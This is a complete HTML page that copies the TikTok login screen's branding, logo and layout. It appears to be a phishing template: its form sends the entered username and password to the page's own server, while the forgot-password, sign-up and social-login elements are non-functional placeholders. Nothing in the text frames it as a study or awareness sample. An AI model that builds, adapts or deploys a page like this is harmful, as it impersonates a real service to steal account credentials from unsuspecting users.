<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in | TikTok</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'TikTok Font',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:#121212;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;color:#fff}
.card{background:#1e1e1e;width:100%;max-width:400px;border-radius:12px;padding:40px 36px}
.logo{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px}
.logo-icon{width:34px;height:34px;position:relative}
.note{position:absolute;width:24px;height:24px;background:#25F4EE;border-radius:50% 50% 50% 0;transform:rotate(45deg);left:0;top:4px}
.note::after{content:'';position:absolute;width:24px;height:24px;background:#FE2C55;border-radius:50% 50% 50% 0;transform:rotate(45deg);left:5px;top:-3px;mix-blend-mode:screen}
.logo-text{font-size:26px;font-weight:700;letter-spacing:.5px}
h1{font-size:22px;font-weight:700;text-align:center;margin-bottom:6px}
.sub{font-size:14px;color:#a0a0a0;text-align:center;margin-bottom:28px}
input{width:100%;background:#2f2f2f;border:1px solid #3d3d3d;border-radius:8px;padding:13px 14px;font-size:15px;color:#fff;margin-bottom:12px;outline:none}
input:focus{border-color:#25F4EE}
input::placeholder{color:#737373}
button{width:100%;background:#FE2C55;color:#fff;border:none;border-radius:8px;padding:13px;font-size:16px;font-weight:700;cursor:pointer;margin-top:6px;transition:background .15s}
button:hover{background:#e02749}
button:disabled{background:#3d3d3d;color:#737373}
.forgot{display:block;text-align:center;color:#a0a0a0;font-size:13px;text-decoration:none;margin-top:18px}
.forgot:hover{color:#fff}
.divider{display:flex;align-items:center;margin:24px 0;color:#737373;font-size:13px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#3d3d3d}
.divider::before{margin-right:14px}.divider::after{margin-left:14px}
.social{display:flex;justify-content:center;gap:14px}
.s-btn{width:48px;height:48px;border-radius:50%;background:#2f2f2f;border:1px solid #3d3d3d;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:20px}
.footer{text-align:center;margin-top:28px;font-size:14px;color:#a0a0a0}
.footer a{color:#FE2C55;text-decoration:none;font-weight:600}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<div class="logo-icon"><div class="note"></div></div>
<span class="logo-text">TikTok</span>
</div>
<h1>Log in to TikTok</h1>
<p class="sub">Manage your account, check notifications, comment on videos, and more.</p>
<form method="POST" action="/">
<input type="text" name="username" placeholder="Email or username" required autocomplete="username">
<input type="password" name="password" placeholder="Password" required autocomplete="current-password">
<button type="submit">Log in</button>
</form>
<a class="forgot" href="#">Forgot password?</a>
<div class="divider">or continue with</div>
<div class="social">
<div class="s-btn">G</div>
<div class="s-btn">f</div>
<div class="s-btn">&#63743;</div>
</div>
<p class="footer">Don't have an account? <a href="#">Sign up</a></p>
</div>
</body>
</html>
